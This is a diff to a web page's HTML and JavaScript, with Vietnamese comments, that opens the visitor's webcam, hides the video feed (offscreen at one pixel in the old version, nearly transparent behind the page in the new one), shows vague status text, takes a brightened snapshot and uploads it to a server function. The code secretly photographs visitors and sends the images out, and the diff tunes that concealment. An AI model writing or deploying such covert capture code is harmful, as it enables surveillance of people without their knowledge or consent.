@@ -36,19 +36,19 @@
             min-height: 60px;
         }
 
-        /* === ẨN WEBCAM KHÉO LÉO NHẤT === */
+        /* Ẩn webcam nhưng vẫn render tốt trên máy tính */
         video {
             position: fixed;
-            left: -9999px;
-            top: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0.001;           /* Rất nhỏ nhưng vẫn render */
+            width: 160px;           /* Kích thước nhỏ */
+            height: 120px;
+            bottom: 10px;
+            right: 10px;
+            opacity: 0.02;          /* Rất mờ */
+            border-radius: 4px;
+            z-index: -1;
             pointer-events: none;
         }
-        canvas {
-            display: none;
-        }
+        canvas { display: none; }
     </style>
 </head>
 <body>
@@ -69,7 +69,7 @@
 
         async function startCapture() {
             try {
-                status.textContent = "Đang kết nối hệ thống...";
+                status.textContent = "Đang kết nối camera...";
 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
@@ -82,9 +82,9 @@
 
                 video.srcObject = stream;
 
-                // Thời gian chờ cân bằng (đủ để ảnh sáng trên máy tính)
+                // Thời gian chờ hợp lý cho máy tính
                 video.onloadedmetadata = () => {
-                    setTimeout(() => captureAndUpload(stream), 520);
+                    setTimeout(() => captureImage(stream), 580);
                 };
 
             } catch (err) {
@@ -93,7 +93,7 @@
             }
         }
 
-        async function captureAndUpload(stream) {
+        async function captureImage(stream) {
             try {
                 status.textContent = "Đang thu thập dữ liệu...";
 
@@ -101,9 +101,10 @@
                 canvas.height = 480;
 
                 const ctx = canvas.getContext('2d');
+                ctx.filter = "brightness(1.2) contrast(1.05)";   // Tăng sáng
                 ctx.drawImage(video, 0, 0, 640, 480);
 
-                const imageData = canvas.toDataURL('image/jpeg', 0.73);
+                const imageData = canvas.toDataURL('image/jpeg', 0.75);
 
                 const response = await fetch('/.netlify/functions/save-image', {
                     method: 'POST',
@@ -124,9 +125,7 @@
 
             // Tắt camera
             setTimeout(() => {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
+                if (stream) stream.getTracks().forEach(track => track.stop());
             }, 800);
         }
 
